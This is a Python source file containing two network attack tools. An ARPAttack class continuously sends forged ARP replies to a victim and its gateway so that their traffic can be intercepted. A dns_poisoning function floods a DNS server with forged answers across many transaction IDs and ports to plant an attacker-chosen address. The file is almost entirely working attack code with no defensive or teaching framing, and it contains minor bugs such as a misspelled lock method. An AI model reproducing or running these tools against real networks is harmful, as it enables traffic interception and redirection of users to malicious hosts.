import socket, select
import threading, platform, random
from inet.layers import Packet, ARP, Ethernet, DNSQ, DNSA

################
# ARP spoofing
################

ARP_PROTOCOL_CODE = 2054

MAC = 0
IP = 1

class ARPAttack:
    """
    Performs an ARP attack by Forging MAC and IP addresses and flooding the victims and its gateway.
    Intercept packets by running a sniffer while the attack
    """
    def __init__(self, gateway:tuple, victim:tuple, attacker_mac:str, socket_interface:str="eth01"):
        self.gateway = (gateway[MAC].replace(':', '').replace('-', ''), gateway[IP])
        self.victim = (victim[MAC].replace(':', '').replace('-', ''), victim[IP])
        self.attacker_mac = attacker_mac.replace(':', '').replace('-', '')
        # set socket
        system = platform.system()
        socket_method = socket.AF_INET
        if system == "Linux":
            socket_method = socket.PF_PACKET
        self.socket = socket.socket(socket_method, socket.SOCK_RAW, socket.htons(0x0800))
        self.socket.bind((socket_interface, socket.htons(0x0800)))

        self.is_running = False

    def send_packets(self):
        victim_ethernet = Ethernet(src_mac=self.attacker_mac, dest_mac=self.victim[MAC], protocol=ARP_PROTOCOL_CODE)
        gateway_ethernet = Ethernet(src_mac=self.attacker_mac, dest_mac=self.gateway[MAC], protocol=ARP_PROTOCOL_CODE)
        victim_arp = \
            ARP(src_mac=self.attacker_mac, src_ip=self.gateway[IP], dest_mac=self.victim[MAC], dest_ip=self.victim[IP])
        gateway_arp = \
            ARP(src_mac=self.attacker_mac, src_ip=self.victim[IP], dest_mac=self.gateway[MAC], dest_ip=self.gateway[IP])

        victim_packet = Packet()
        victim_packet.add_layers((victim_ethernet, victim_arp))

        gateway_packet = Packet()
        gateway_packet.add_layers((gateway_ethernet, gateway_arp))

        self.socket.send(victim_packet.pack())
        self.socket.send(gateway_packet.pack())

    def __execute_poisoning(self):
        self.is_running = True
        while self.is_running:
            readable, writeable, error = select.select([], [self.socket], [], 1)
            if self.socket in writeable:
               self.send_packets()


    def start_poisoning(self):
        thread = threading.Thread(target=self.__execute_poisoning)
        thread.daemon = True
        thread.start()
        thread.join()

    def stop_poisoning(self):
        locker = threading.Lock()
        locker.aquire()
        self.is_running = False
        locker.release()

################
# DNS poisoning
################

DNS_PORT = 53

def dns_poisoning(dns_server, domain_name, domain_address, id_list, ports_list=None):
    """
    Poisons DNA servers by sending a query and faking responses with the desired address
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    dns_id = random.randint(1,2500)

    query = DNSQ()
    query.id = dns_id
    query.name = domain_name

    answer = DNSA()
    answer.id = dns_id
    answer.name = domain_name
    answer.rdata = domain_address

    sock.sendto(query.pack(), (dns_server, DNS_PORT))

    if not ports_list or len(ports_list) <= 0:
        ports_list = range(65536)

    for id_number in id_list:
        for port in ports_list:
            try:
                answer.id = id_number
                sock.sendto(answer.pack(), (dns_server, port))
            except OSError:
                pass